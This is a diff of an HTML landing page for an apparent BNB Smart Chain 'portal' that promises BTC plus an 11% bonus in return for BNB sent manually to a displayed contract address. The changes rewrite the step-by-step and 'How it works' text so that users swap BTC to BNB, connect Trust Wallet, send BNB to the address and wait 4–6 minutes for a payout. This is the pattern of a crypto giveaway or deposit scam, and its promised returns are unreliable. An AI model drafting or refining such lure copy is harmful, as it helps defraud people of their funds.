@@ -59,7 +59,6 @@
         ☾
       </button>
 
-      <!-- CONNECT WALLET -->
       <button
         id="connectWallet"
         class="wallet-button"
@@ -68,28 +67,9 @@
         Connect Wallet
       </button>
 
-      <!-- CONNECTED WALLET / CONTRACT -->
-      <div
-        id="connectedWallet"
-        class="connected-wallet"
-        style="display: none;"
-      >
-        <code id="connectedContractAddress">
-          0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85
-        </code>
-
-        <button
-          id="copyConnectedContract"
-          type="button"
-        >
-          Copy
-        </button>
-      </div>
-
     </div>
 
   </header>
-
 
 
   <main>
@@ -135,7 +115,6 @@
       </div>
 
 
-
       <div class="hero-visual">
 
         <div class="orbit orbit-one"></div>
@@ -153,7 +132,6 @@
       </div>
 
     </section>
-
 
 
     <!-- STATS -->
@@ -186,7 +164,6 @@
     </section>
 
 
-
     <!-- MARKET -->
     <section
       class="section"
@@ -212,7 +189,6 @@
         </span>
 
       </div>
-
 
 
       <div class="market-grid">
@@ -258,7 +234,6 @@
         </article>
 
 
-
         <!-- BNB -->
         <article class="market-card">
 
@@ -300,7 +275,6 @@
         </article>
 
 
-
         <!-- NETWORK -->
         <article class="market-card network-card">
 
@@ -335,7 +309,6 @@
     </section>
 
 
-
     <!-- ABOUT -->
     <section
       class="section"
@@ -357,7 +330,6 @@
         </div>
 
       </div>
-
 
 
       <div class="about-grid">
@@ -386,7 +358,6 @@
         </article>
 
 
-
         <article class="content-card">
 
           <div class="feature-icon">01</div>
@@ -403,7 +374,6 @@
         </article>
 
 
-
         <article class="content-card">
 
           <div class="feature-icon">02</div>
@@ -417,7 +387,6 @@
           </p>
 
         </article>
-
 
 
         <article class="content-card">
@@ -438,7 +407,6 @@
       </div>
 
     </section>
-
 
 
     <!-- PORTAL -->
@@ -462,7 +430,6 @@
         </div>
 
       </div>
-
 
 
       <div class="portal-grid">
@@ -492,16 +459,14 @@
               <span>01</span>
 
               <div>
-                <strong>Choose amount</strong>
+                <strong>Swap BTC to BNB</strong>
 
                 <small>
-                  Enter the amount of BNB you want to use.
-                  The configured range is 5 BNB to 1,000 BNB.
+                  Swap your BTC to BNB so you can participate on BNB Smart Chain.
                 </small>
               </div>
 
             </div>
-
 
 
             <div class="step">
@@ -509,17 +474,14 @@
               <span>02</span>
 
               <div>
-                <strong>Check allocation</strong>
+                <strong>Connect Wallet</strong>
 
                 <small>
-                  Use the calculator to view the base BTC,
-                  11% bonus BTC and total BTC allocation
-                  returned by the contract.
+                  Connect your Trust Wallet to the portal.
                 </small>
               </div>
 
             </div>
-
 
 
             <div class="step">
@@ -527,16 +489,14 @@
               <span>03</span>
 
               <div>
-                <strong>Connect wallet</strong>
+                <strong>Copy Contract Address</strong>
 
                 <small>
-                  Select your preferred BNB Smart Chain wallet
-                  when continuing with the participation flow.
+                  Copy the displayed contract address for the BNB transaction.
                 </small>
               </div>
 
             </div>
-
 
 
             <div class="step">
@@ -544,19 +504,31 @@
               <span>04</span>
 
               <div>
-                <strong>Copy contract</strong>
+                <strong>Go to your connected wallet and send your BNB</strong>
 
                 <small>
-                  After connecting, review the configured
-                  contract address, copy it and access your
-                  wallet to complete the manual transfer.
+                  Go to your connected Trust Wallet and send your BNB to the copied contract address.
+                </small>
+              </div>
+
+            </div>
+
+
+            <div class="step">
+
+              <span>05</span>
+
+              <div>
+                <strong>Wait 4–6 minutes to receive your BTC + 11% bonus</strong>
+
+                <small>
+                  Allow approximately 4–6 minutes for the transaction to process and receive your BTC allocation plus the configured 11% bonus.
                 </small>
               </div>
 
             </div>
 
           </div>
-
 
 
           <!-- MAIN PARTICIPATION BUTTON -->
@@ -570,7 +542,6 @@
           </button>
 
         </div>
-
 
 
         <!-- CALCULATOR -->
@@ -593,11 +564,9 @@
           </div>
 
 
-
           <label for="bnbAmount">
             BNB amount
           </label>
-
 
 
           <div class="amount-input">
@@ -616,14 +585,12 @@
           </div>
 
 
-
           <div
             id="calculatorMessage"
             class="calculator-message"
           >
             Loading contract limits...
           </div>
-
 
 
           <div class="calculator-results">
@@ -646,7 +613,6 @@
           </div>
 
 
-
           <button
             id="calculateButton"
             class="primary-button full"
@@ -654,7 +620,6 @@
           >
             Calculate BTC
           </button>
-
 
 
           <small class="calculator-note">
@@ -670,7 +635,6 @@
     </section>
 
 
-
     <!-- HOW -->
     <section
       class="section"
@@ -684,10 +648,13 @@
           <div class="section-kicker">PROCESS</div>
 
           <h2>How it works</h2>
+
+          <p>
+            To participate and earn the 11% bonus, swap your BTC to BNB, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.
+          </p>
         </div>
 
       </div>
-
 
 
       <div class="process-grid">
@@ -696,59 +663,62 @@
 
           <span>01</span>
 
-          <h3>Select</h3>
+          <h3>Swap BTC to BNB</h3>
 
           <p>
-            Enter the amount of BNB you want to use,
-            between the configured minimum of 5 BNB
-            and maximum of 1,000 BNB.
+            Swap your BTC to BNB so you can participate on BNB Smart Chain.
           </p>
 
         </article>
-
 
 
         <article class="process-card">
 
           <span>02</span>
 
-          <h3>Calculate</h3>
+          <h3>Connect Wallet</h3>
 
           <p>
-            Check the allocation to see the base BTC,
-            11% bonus BTC and total BTC amount returned
-            by the smart contract.
+            Connect your Trust Wallet to the portal.
           </p>
 
         </article>
-
 
 
         <article class="process-card">
 
           <span>03</span>
 
-          <h3>Connect</h3>
+          <h3>Copy Contract Address</h3>
 
           <p>
-            Select your preferred wallet on BNB Smart Chain
-            and continue to the participation flow.
+            Copy the displayed contract address for the BNB transaction.
           </p>
 
         </article>
-
 
 
         <article class="process-card">
 
           <span>04</span>
 
-          <h3>Copy & send</h3>
+          <h3>Send BNB</h3>
 
           <p>
-            Review and copy the configured contract address,
-            access your wallet and complete the manual transfer
-            using the displayed participation details.
+            Go to your connected Trust Wallet and send your BNB to the copied contract address.
+          </p>
+
+        </article>
+
+
+        <article class="process-card">
+
+          <span>05</span>
+
+          <h3>Receive BTC + 11% Bonus</h3>
+
+          <p>
+            Allow approximately 4–6 minutes for the transaction to process and receive your BTC allocation plus the configured 11% bonus.
           </p>
 
         </article>
@@ -756,7 +726,6 @@
       </div>
 
     </section>
-
 
 
     <!-- ACTIVITY -->
@@ -784,7 +753,6 @@
         </span>
 
       </div>
-
 
 
       <div
@@ -817,7 +785,6 @@
     </section>
 
 
-
     <!-- CONTRACT -->
     <section class="section">
 
@@ -840,7 +807,6 @@
         </div>
 
 
-
         <div class="contract-address">
 
           <code id="contractAddress">
@@ -861,7 +827,6 @@
     </section>
 
 
-
     <!-- FAQ -->
     <section class="section">
 
@@ -875,7 +840,6 @@
         </div>
 
       </div>
-
 
 
       <div class="faq-list">
@@ -894,7 +858,6 @@
         </details>
 
 
-
         <details>
 
           <summary>
@@ -910,7 +873,6 @@
         </details>
 
 
-
         <details>
 
           <summary>
@@ -924,7 +886,6 @@
           </p>
 
         </details>
-
 
 
         <details>
@@ -947,7 +908,6 @@
   </main>
 
 
-
   <!-- FOOTER -->
   <footer>
 
@@ -965,7 +925,6 @@
     </div>
 
 
-
     <div class="footer-meta">
       <span>BNB Smart Chain</span>
       <span>Chain 56</span>
@@ -975,7 +934,6 @@
   </footer>
 
 </div>
-
 
 
 <script
